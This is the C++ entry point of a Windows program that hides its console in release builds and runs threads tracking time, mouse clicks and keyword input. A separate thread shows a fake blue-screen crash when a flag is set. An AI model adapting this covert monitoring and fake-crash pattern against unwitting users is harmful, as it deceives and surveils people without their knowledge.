#include <windows.h>
#include <memory>
#include <thread>
#include<iostream>
#include "global_count.h"
#include "times.h"
#include "mouse.h"
#include "keyword.h"
#include "blue_screen.h"

class ThreadPool {
public:
    ThreadPool(GlobalCount& gc) : gc_(gc) {
        startThreads();
    }

    ~ThreadPool() {
        stopThreads();
    }

private:
    void startThreads() {
        time_thread_ = std::thread(update_time, &gc_);
        click_thread_ = std::thread(update_click, &gc_);
        keyword_thread_ = std::thread(update_keyword, &gc_);
    }

    void stopThreads() {
        gc_.stopUpdates();
        if (time_thread_.joinable()) time_thread_.join();
        if (click_thread_.joinable()) click_thread_.join();
        if (keyword_thread_.joinable()) keyword_thread_.join();
    }

    GlobalCount& gc_;
    std::thread time_thread_;
    std::thread click_thread_;
    std::thread keyword_thread_;
};

int main() {
    try {
        #ifdef ENABLE_DEBUG_MODE
        // 调试模式 - 保留控制台窗口
        std::cout << "Debug mode - Console window visible" << std::endl;
        #else
        // Release模式 - 完全隐藏
        FreeConsole(); // 完全脱离控制台
        SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
        #endif

        GlobalCount gc;
        BlueScreenSimulator blueScreen(gc);
        
        // 启动蓝屏监控线程
        std::thread blueScreenThread([&gc, &blueScreen]() {
            while (gc.shouldUpdateTime()) {
                if (gc.isFakeBlueScreen() && !gc.isBlueScreenActive()) {
                    blueScreen.start();
                } else if (!gc.isFakeBlueScreen() && gc.isBlueScreenActive()) {
                    blueScreen.stop();
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
        });

        ThreadPool pool(gc);
        
        // 主线程等待工作线程完成
        if (blueScreenThread.joinable()) {
            blueScreenThread.join();
        }
        
        return 0;
    } catch (const std::exception& e) {
        // 错误处理可以记录到日志文件
        return 1;
    }
}